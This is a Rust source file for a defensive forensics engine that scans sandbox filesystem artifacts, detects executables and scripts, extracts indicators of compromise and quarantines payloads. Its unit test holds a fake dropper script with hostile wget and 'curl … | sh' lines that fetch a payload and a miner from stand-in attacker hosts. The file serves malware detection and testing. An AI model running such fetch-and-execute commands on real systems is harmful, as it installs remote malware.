//! `aegis-forensics` — Autonomous threat intelligence and malware carving engine.
//!
//! Ingests OverlayFS UpperDir artifacts from torn-down sandbox sessions,
//! identifies malicious files, extracts IOCs, quarantines payloads, and
//! emits `PayloadCaptured` telemetry events.

use aegis_common::{
    AegisError, AegisResult, IocFindings, PayloadCapturedEvent, PayloadFileType, SessionMeta,
    TelemetryEvent,
};
use chrono::Utc;
use regex::Regex;
use sha2::{Digest, Sha256};
use std::net::IpAddr;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::sync::OnceLock;
use tokio::fs;
use tokio::sync::mpsc;
use tracing::{debug, info, warn};
use walkdir::WalkDir;

// ---------------------------------------------------------------------------
// IOC Regex Patterns (compiled once at startup)
// ---------------------------------------------------------------------------

static RE_IPV4: OnceLock<Regex> = OnceLock::new();
static RE_URL: OnceLock<Regex> = OnceLock::new();
static RE_BASE64: OnceLock<Regex> = OnceLock::new();
static RE_MONERO: OnceLock<Regex> = OnceLock::new();

fn re_ipv4() -> &'static Regex {
    RE_IPV4.get_or_init(|| {
        Regex::new(r"\b(?:\d{1,3}\.){3}\d{1,3}\b").unwrap()
    })
}
fn re_url() -> &'static Regex {
    RE_URL.get_or_init(|| {
        Regex::new(r"https?://[^\s'<>]+").unwrap()
    })
}
fn re_base64() -> &'static Regex {
    RE_BASE64.get_or_init(|| {
        Regex::new(r"[A-Za-z0-9+/]{32,}={0,2}").unwrap()
    })
}
fn re_monero() -> &'static Regex {
    RE_MONERO.get_or_init(|| {
        Regex::new(r"4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}").unwrap()
    })
}

// ---------------------------------------------------------------------------
// File Magic Detection
// ---------------------------------------------------------------------------

/// ELF magic: 0x7f 'E' 'L' 'F'
const ELF_MAGIC: &[u8; 4] = &[0x7f, b'E', b'L', b'F'];
/// PE/MZ magic
const MZ_MAGIC: &[u8; 2] = b"MZ";
/// Shell shebang
const SHEBANG: &[u8; 2] = b"#!";

fn detect_file_type(data: &[u8]) -> PayloadFileType {
    if data.len() >= 4 && &data[..4] == ELF_MAGIC {
        PayloadFileType::Elf
    } else if data.len() >= 2 && &data[..2] == MZ_MAGIC {
        PayloadFileType::Pe
    } else if data.len() >= 2 && &data[..2] == SHEBANG {
        PayloadFileType::Shell
    } else {
        PayloadFileType::Unknown
    }
}

// ---------------------------------------------------------------------------
// String Extraction (like GNU `strings`)
// ---------------------------------------------------------------------------

fn extract_strings(data: &[u8], min_len: usize) -> Vec<String> {
    let mut results = Vec::new();
    let mut current = Vec::new();

    for &byte in data {
        if byte.is_ascii_graphic() || byte == b' ' {
            current.push(byte);
        } else {
            if current.len() >= min_len {
                if let Ok(s) = std::str::from_utf8(&current) {
                    results.push(s.to_owned());
                }
            }
            current.clear();
        }
    }
    if current.len() >= min_len {
        if let Ok(s) = std::str::from_utf8(&current) {
            results.push(s.to_owned());
        }
    }
    results
}

// ---------------------------------------------------------------------------
// IOC Extraction
// ---------------------------------------------------------------------------

fn extract_iocs(strings: &[String]) -> IocFindings {
    let haystack = strings.join(" ");

    let ip_addresses: Vec<String> = re_ipv4()
        .find_iter(&haystack)
        .map(|m| m.as_str().to_owned())
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();

    let urls: Vec<String> = re_url()
        .find_iter(&haystack)
        .map(|m| m.as_str().to_owned())
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();

    let base64_blobs: Vec<String> = re_base64()
        .find_iter(&haystack)
        .map(|m| m.as_str().to_owned())
        .take(10)
        .collect();

    let monero_wallets: Vec<String> = re_monero()
        .find_iter(&haystack)
        .map(|m| m.as_str().to_owned())
        .collect();

    IocFindings {
        strings_preview: strings.iter().take(20).cloned().collect(),
        ip_addresses,
        urls,
        base64_blobs,
        monero_wallets,
    }
}

// ---------------------------------------------------------------------------
// ForensicsEngine
// ---------------------------------------------------------------------------

pub struct ForensicsEngine {
    quarantine_dir: PathBuf,
    string_min_len: usize,
    event_tx: mpsc::Sender<TelemetryEvent>,
}

impl ForensicsEngine {
    pub fn new(
        quarantine_dir: impl AsRef<Path>,
        string_min_len: usize,
        event_tx: mpsc::Sender<TelemetryEvent>,
    ) -> Self {
        Self {
            quarantine_dir: quarantine_dir.as_ref().to_path_buf(),
            string_min_len,
            event_tx,
        }
    }

    /// Analyze an OverlayFS UpperDir after sandbox teardown.
    /// Walks every new/modified file, detects malware, quarantines it,
    /// and emits telemetry events.
    pub async fn analyze_upperdir(
        &self,
        upper_dir: &Path,
        meta: &SessionMeta,
    ) -> AegisResult<()> {
        fs::create_dir_all(&self.quarantine_dir).await?;

        for entry in WalkDir::new(upper_dir)
            .follow_links(false)
            .into_iter()
            .filter_map(|e| e.ok())
        {
            if !entry.file_type().is_file() {
                continue;
            }

            let path = entry.path();
            match self.analyze_file(path, meta).await {
                Ok(true) => info!("Quarantined: {}", path.display()),
                Ok(false) => debug!("Skipped (benign): {}", path.display()),
                Err(e) => warn!("Error analyzing {}: {e}", path.display()),
            }
        }
        Ok(())
    }

    /// Returns `true` if the file was quarantined as a payload.
    async fn analyze_file(
        &self,
        path: &Path,
        meta: &SessionMeta,
    ) -> AegisResult<bool> {
        let data = fs::read(path).await?;
        if data.is_empty() {
            return Ok(false);
        }

        let file_type = detect_file_type(&data);
        let is_interesting = matches!(
            file_type,
            PayloadFileType::Elf | PayloadFileType::Shell | PayloadFileType::Pe
        );
        if !is_interesting {
            return Ok(false);
        }

        // Hash
        let mut hasher = Sha256::new();
        hasher.update(&data);
        let sha256 = hex::encode(hasher.finalize());

        // Quarantine
        let qpath = self.quarantine_dir.join(&sha256);
        fs::write(&qpath, &data).await?;
        fs::set_permissions(&qpath, std::fs::Permissions::from_mode(0o600)).await?;

        // Extract strings & IOCs
        let strings = extract_strings(&data, self.string_min_len);
        let iocs = extract_iocs(&strings);

        let event = TelemetryEvent::PayloadCaptured(PayloadCapturedEvent {
            timestamp: Utc::now(),
            session_id: meta.session_id.clone(),
            ip: meta.client_ip,
            source_url: None, // URL is known only via PayloadCarver in the gateway
            sha256: sha256.clone(),
            size_bytes: data.len() as u64,
            quarantine_path: qpath.to_string_lossy().to_string(),
            file_type,
            iocs,
        });

        self.event_tx
            .send(event)
            .await
            .map_err(|_| AegisError::ChannelClosed)?;

        Ok(true)
    }

    /// Analyze a raw byte payload directly (e.g. from wget/curl interception).
    pub async fn analyze_payload(
        &self,
        data: &[u8],
        source_url: Option<String>,
        client_ip: IpAddr,
        meta: &SessionMeta,
    ) -> AegisResult<Option<String>> {
        if data.is_empty() {
            return Ok(None);
        }

        fs::create_dir_all(&self.quarantine_dir).await?;

        let mut hasher = Sha256::new();
        hasher.update(data);
        let sha256 = hex::encode(hasher.finalize());

        let qpath = self.quarantine_dir.join(&sha256);
        fs::write(&qpath, data).await?;
        fs::set_permissions(&qpath, std::fs::Permissions::from_mode(0o600)).await?;

        let file_type = detect_file_type(data);
        let strings = extract_strings(data, self.string_min_len);
        let iocs = extract_iocs(&strings);

        let event = TelemetryEvent::PayloadCaptured(PayloadCapturedEvent {
            timestamp: Utc::now(),
            session_id: meta.session_id.clone(),
            ip: client_ip,
            source_url,
            sha256: sha256.clone(),
            size_bytes: data.len() as u64,
            quarantine_path: qpath.to_string_lossy().to_string(),
            file_type,
            iocs,
        });

        self.event_tx
            .send(event)
            .await
            .map_err(|_| AegisError::ChannelClosed)?;

        Ok(Some(sha256))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_analyze_upperdir_finds_and_quarantines_payload() {
        let temp_upper = std::env::temp_dir().join(format!("aegis_test_upper_{}", uuid::Uuid::new_v4()));
        let temp_quarantine = std::env::temp_dir().join(format!("aegis_test_quarantine_{}", uuid::Uuid::new_v4()));

        tokio::fs::create_dir_all(temp_upper.join("tmp")).await.unwrap();

        // Drop a malicious shell script with IP and URL IOCs
        let payload = "#!/bin/bash\nwget http://evil-c2.net/payload.bin\ncurl 198.51.100.45:8080/miner.sh | sh\n";
        tokio::fs::write(temp_upper.join("tmp/dropper.sh"), payload.as_bytes()).await.unwrap();

        let (tx, mut rx) = mpsc::channel(32);
        let engine = ForensicsEngine::new(&temp_quarantine, 4, tx);

        let meta = SessionMeta::new("127.0.0.1".parse().unwrap(), 2222);
        let res = engine.analyze_upperdir(&temp_upper, &meta).await;
        assert!(res.is_ok());

        // Verify event was emitted
        let event = rx.recv().await.expect("Expected TelemetryEvent");
        if let TelemetryEvent::PayloadCaptured(p) = event {
            assert_eq!(p.file_type, PayloadFileType::Shell);
            assert!(p.iocs.urls.iter().any(|u| u.contains("evil-c2.net")));
            assert!(p.iocs.ip_addresses.iter().any(|ip| ip == "198.51.100.45"));
            assert!(Path::new(&p.quarantine_path).exists());
        } else {
            panic!("Expected PayloadCaptured event");
        }

        let _ = tokio::fs::remove_dir_all(&temp_upper).await;
        let _ = tokio::fs::remove_dir_all(&temp_quarantine).await;
    }
}
